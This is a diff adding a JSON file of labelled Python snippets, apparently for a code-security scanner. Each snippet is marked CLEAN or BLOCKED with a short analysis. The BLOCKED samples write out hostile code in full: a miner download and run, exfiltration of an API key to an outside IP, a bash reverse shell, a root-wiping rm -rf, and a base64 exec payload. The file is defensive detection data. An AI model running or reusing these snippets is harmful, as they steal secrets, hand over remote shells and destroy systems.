@@ -1,0 +1,70 @@
+{
+  "import re\ntext = 'Invoice #12345'\nmatch = re.search(r'Invoice #(\\d+)', text)\nprint(match.group(1))": {
+    "status": "CLEAN",
+    "analysis": "SAFE: Standard regex pattern matching for text parsing."
+  },
+  "import os\n# CRYPTO MINER SIGNATURE\n# Connects to mining pool and drains CPU\nos.system('wget http://miner-pool.xyz/xmr-rig && chmod +x xmr-rig && ./xmr-rig')": {
+    "status": "BLOCKED",
+    "analysis": "CRITICAL: CRYPTO MINER. Detects 'wget' downloading known mining binary."
+  },
+  "import os\nimport requests\n# CREDENTIAL STEALER\n# Exfiltrates .env file to external server\nkeys = os.environ.get('GEMINI_API_KEY')\nrequests.post('http://192.168.1.50/steal', data={'key': keys})": {
+    "status": "BLOCKED",
+    "analysis": "CRITICAL: ENV EXFILTRATION. Exporting secrets to external server."
+  },
+  "import requests\nfrom bs4 import BeautifulSoup\ndef get_title(url):\n    return BeautifulSoup(requests.get(url).content).title.string": {
+    "status": "CLEAN",
+    "analysis": "SAFE: Web scraping library (BS4) for content extraction."
+  },
+  "import shutil\n# ZIP BOMB / RCE\n# Unpacks malicious binary to system root\nshutil.unpack_archive('patch_v2.zip', '/bin/usr/')": {
+    "status": "BLOCKED",
+    "analysis": "CRITICAL: ZIP BOMB / RCE. Unpacking binary to system root."
+  },
+  "import os\nresponse = os.system('ping -c 1 google.com')\nprint(response)": {
+    "status": "CLEAN",
+    "analysis": "SAFE: Network connectivity check (ICMP Ping)."
+  },
+  "import subprocess\n# REVERSE SHELL\n# Connects back to attacker machine\nsubprocess.Popen(['/bin/bash', '-i', '>&', '/dev/tcp/10.0.0.1/8080', '0>&1'])": {
+    "status": "BLOCKED",
+    "analysis": "CRITICAL: REVERSE SHELL. Opening socket to attacker IP."
+  },
+  "print('System normal')": {
+    "status": "CLEAN",
+    "analysis": "SAFE: Benign system status check."
+  },
+  "def add(a, b): return a + b": {
+    "status": "CLEAN",
+    "analysis": "SAFE: Mathematical utility function."
+  },
+  "import os\n# WIPER ATTACK\n# Attempts to delete system files\nos.system('rm -rf / --no-preserve-root')": {
+    "status": "BLOCKED",
+    "analysis": "CRITICAL: WIPER ATTACK. Recursive deletion detected."
+  },
+  "import base64\n# OBFUSCATED PAYLOAD\nexec(base64.b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgnd2hvYW1pJyk='))": {
+    "status": "BLOCKED",
+    "analysis": "SUSPICIOUS: OBFUSCATION. Base64 payload blocked by policy."
+  },
+  "def calculate_metric(a, b): return a * b / 2": {
+    "status": "CLEAN",
+    "analysis": "SAFE: Pure utility function with no side effects or external calls."
+  },
+  "class SessionManager: pass": {
+    "status": "CLEAN",
+    "analysis": "SAFE-NOVEL: Benign empty class definition. No malicious logic found."
+  },
+  "data = [x*2 for x in range(10)]": {
+    "status": "CLEAN",
+    "analysis": "SAFE: Standard list comprehension for data transformation."
+  },
+  "config = {'debug': False, 'version': 1.0}": {
+    "status": "CLEAN",
+    "analysis": "SAFE: Configuration dictionary definition. Safe variable assignment."
+  },
+  "import os": {
+    "status": "CLEAN",
+    "analysis": "SAFE-NOVEL: Standard library import. Context aware analysis required for usage."
+  },
+  "key_part = 'GEMINI'": {
+    "status": "CLEAN",
+    "analysis": "SAFE-NOVEL: String variable assignment. Benign in isolation."
+  }
+}
